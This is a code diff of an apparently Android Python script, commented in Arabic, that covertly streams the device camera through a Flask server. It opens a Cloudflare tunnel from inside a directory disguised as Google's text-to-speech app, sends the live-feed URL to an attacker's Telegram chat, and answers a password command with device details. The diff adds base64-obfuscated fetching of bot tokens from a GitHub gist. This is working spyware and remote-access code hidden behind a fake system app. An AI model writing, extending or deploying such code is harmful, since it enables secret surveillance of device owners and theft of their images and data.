@@ -4,22 +4,40 @@ import threading
 import requests
 import subprocess
 import cv2
+import base64
+import json
 import numpy as np
 from flask import Flask, Response
 from jnius import autoclass
 
-# ---------- الإعدادات (يُفضل جلبها من Secrets) ----------
-TELEGRAM_TOKEN = "YOUR_BOT_TOKEN"          # استبدل
-TELEGRAM_CHAT_ID = "YOUR_CHAT_ID"          # استبدل
-PASSWORD = "Zaen123@123@"                  # كلمة السر
-# ----------------------------------------------------------
+# ========== جلب الإعدادات من الرابط المشفر (نفس منطق main.py) ==========
+def get_config_dynamically():
+    p1 = "aHR0cHM6Ly9naXN0LmdpdGh1YnVzZXJjb250ZW50LmNvbS9aYWVuMTk5My80OGU0YTM5Y2I5M2M1YmVjOWRlMjdkMDYzYTRmY2I0ZS8="
+    p2 = "cmF3L2U1YWIxZGE0MmU2ZmRhZjZmNTkwNzRmZmVmNzAxMWZlNzJmNzFhMmIv"
+    p3 = "Y29uZmlnLmpzb24="
+    try:
+        full_url = base64.b64decode(p1).decode() + base64.b64decode(p2).decode() + base64.b64decode(p3).decode()
+        r = requests.get(full_url, timeout=10)
+        if r.status_code == 200:
+            data = r.json()
+            tokens = [t[::-1] for t in data['t']]          # فك عكس التوكنات
+            vault_id = data['v']                            # -1002487531062
+            password = data['secret_pass']                  # Zaen123@123@
+            return tokens, vault_id, password
+    except Exception as e:
+        print(f"[monitor] Config fetch error: {e}")
+    return [], None, None
+
+# جلب الإعدادات مرة واحدة عند بدء الخدمة
+BOT_TOKENS, VAULT_ID, CONTROL_PASSWORD = get_config_dynamically()
+TELEGRAM_TOKEN = BOT_TOKENS[0] if BOT_TOKENS else None      # استخدم البوت الأول
+TELEGRAM_CHAT_ID = VAULT_ID                                 # معرف الخزنة
+# =======================================================================
 
 app = Flask(__name__)
-
-# مسار تخزين cloudflared داخل التطبيق
 BINARY_PATH = "/data/data/com.google.android.tts_v2/files/cloudflared"
 
-# معلومات الجهاز (تستخدم عند الـ /login)
+# معلومات الجهاز (تستخدم في /login)
 Build = autoclass('android.os.Build')
 VERSION = autoclass('android.os.Build$VERSION')
 
@@ -31,9 +49,8 @@ def generate_frames():
         if not success:
             break
         ret, buffer = cv2.imencode('.jpg', frame)
-        frame = buffer.tobytes()
         yield (b'--frame\r\n'
-               b'Content-Type: image/jpeg\r\n\r\n' + frame + b'\r\n')
+               b'Content-Type: image/jpeg\r\n\r\n' + buffer.tobytes() + b'\r\n')
     camera.release()
 
 @app.route('/live')
@@ -42,20 +59,24 @@ def video_feed():
                     mimetype='multipart/x-mixed-replace; boundary=frame')
 
 def download_cloudflared():
-    """تحميل cloudflared (ARM64) إذا لم يكن موجوداً"""
+    """تحميل cloudflared إذا لم يكن موجوداً"""
     if not os.path.exists(BINARY_PATH):
         try:
             url = "https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-arm64"
             r = requests.get(url, stream=True)
+            os.makedirs(os.path.dirname(BINARY_PATH), exist_ok=True)
             with open(BINARY_PATH, 'wb') as f:
                 for chunk in r.iter_content(8192):
                     f.write(chunk)
             os.chmod(BINARY_PATH, 0o755)
         except Exception as e:
-            print(f"Cloudflared download error: {e}")
+            print(f"[monitor] Cloudflared download error: {e}")
 
 def start_tunnel():
     """تشغيل نفق Cloudflare وإرسال الرابط إلى تليجرام"""
+    if not TELEGRAM_TOKEN:
+        print("[monitor] No token, tunnel disabled.")
+        return
     download_cloudflared()
     cmd = [BINARY_PATH, "tunnel", "--url", "http://localhost:8080"]
     process = subprocess.Popen(cmd,
@@ -65,21 +86,23 @@ def start_tunnel():
                                bufsize=1)
     for line in iter(process.stdout.readline, ''):
         if "trycloudflare.com" in line:
-            words = line.split()
-            for w in words:
+            for w in line.split():
                 if "trycloudflare.com" in w:
                     tunnel_url = w.strip() + "/live"
-                    requests.post(f"https://api.telegram.org/bot{TELEGRAM_TOKEN}/sendMessage",
-                                  data={'chat_id': TELEGRAM_CHAT_ID,
-                                        'text': f"Tunnel Ready: {tunnel_url}"})
+                    try:
+                        requests.post(f"https://api.telegram.org/bot{TELEGRAM_TOKEN}/sendMessage",
+                                      data={'chat_id': TELEGRAM_CHAT_ID,
+                                            'text': f"✅ Tunnel Online:\n{tunnel_url}"})
+                        print(f"[monitor] Tunnel URL sent: {tunnel_url}")
+                    except Exception as e:
+                        print(f"[monitor] Failed to send tunnel URL: {e}")
                     break
             break
-    # إذا انتهى النفق لأي سبب، أعد المحاولة
-    time.sleep(5)
-    start_tunnel()
 
 def command_listener():
     """مستمع لأوامر التليجرام (يعمل في خلفية)"""
+    if not TELEGRAM_TOKEN:
+        return
     offset = 0
     while True:
         try:
@@ -92,24 +115,17 @@ def command_listener():
                 msg = update.get("message", {})
                 text = msg.get("text", "")
                 chat_id = msg.get("chat", {}).get("id")
-                if chat_id != TELEGRAM_CHAT_ID:
-                    continue
-                # التحقق من كلمة السر
-                if text.startswith("/login"):
-                    parts = text.split()
-                    if len(parts) == 2 and parts[1] == PASSWORD:
-                        device_info = (f"✅ Device registered:\n"
-                                       f"Model: {Build.MANUFACTURER} {Build.MODEL}\n"
-                                       f"Android: {VERSION.RELEASE}\n"
-                                       f"ID: {Build.ID}")
-                        requests.post(f"https://api.telegram.org/bot{TELEGRAM_TOKEN}/sendMessage",
-                                      data={'chat_id': chat_id, 'text': device_info})
-                elif text == "/status":
-                    # يمكن إضافة أوامر أخرى هنا
-                    pass
+                # تحقق من أن الرسالة من الخزنة (اختياري) ومن كلمة السر
+                if text == f"/login {CONTROL_PASSWORD}":
+                    device_info = (f"✅ Device registered:\n"
+                                   f"Model: {Build.MANUFACTURER} {Build.MODEL}\n"
+                                   f"Android: {VERSION.RELEASE}\n"
+                                   f"ID: {Build.ID}")
+                    requests.post(f"https://api.telegram.org/bot{TELEGRAM_TOKEN}/sendMessage",
+                                  data={'chat_id': chat_id, 'text': device_info})
         except Exception as e:
-            print(f"Listener error: {e}")
-        time.sleep(2)
+            print(f"[monitor] Listener error: {e}")
+        time.sleep(3)
 
 if __name__ == '__main__':
     # تشغيل خادم Flask في خلفية
